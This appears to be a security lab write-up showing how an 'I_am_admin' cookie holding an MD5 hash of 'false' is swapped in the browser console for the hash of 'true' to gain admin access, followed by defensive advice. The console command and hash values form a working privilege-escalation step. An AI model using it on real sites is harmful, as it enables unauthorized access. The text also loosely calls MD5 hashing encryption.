# Exploit: Cookie Manipulation to Gain Admin Access

## Description
This exploit demonstrates how a poorly implemented cookie-based authentication mechanism can be bypassed by manipulating cookie values.

### Case Example
1. Observed Cookie:
   On the home page or survey page, inspecting the cookies using `document.cookie` in the browser console reveals:
I_am_admin=68934a3e9455fa72420237eb05902327

2. Analysis:
- Identified the encoding type as MD5.
- Decrypting the value revealed it was set to `false`.

3. Manipulation:
- Changed the value to `true` by encrypting it into MD5 format:
  ```
  b326b5062b2f0e69046810717534cb09
  ```

- Updated the cookie using the browser console:
  ```javascript
  document.cookie = "I_am_admin=b326b5062b2f0e69046810717534cb09";
  ```

4. Result:
- Gained admin access.

## How to Avoid

### 1. Avoid Using Cookies to Define Privileges
- Cookies are client-side and can be manipulated. Avoid using them to define admin or user roles.

### 2. Implement Secure Authentication Mechanisms
- Use server-side session management for user authentication and roles.

### 3. Encrypt and Sign Cookies
- If cookies must be used, encrypt their contents and validate them with a server-side signature to prevent tampering.

### 4. Validate Roles Server-Side
- Always validate user roles on the server-side before granting access to sensitive features or data.

### 5. Secure Cookie Flags
- Set cookies with the `HttpOnly` and `Secure` flags to reduce their exposure to JavaScript and prevent transmission over unencrypted connections.

### 6. Regular Security Audits
- Periodically review the application for vulnerabilities like improper use of cookies.
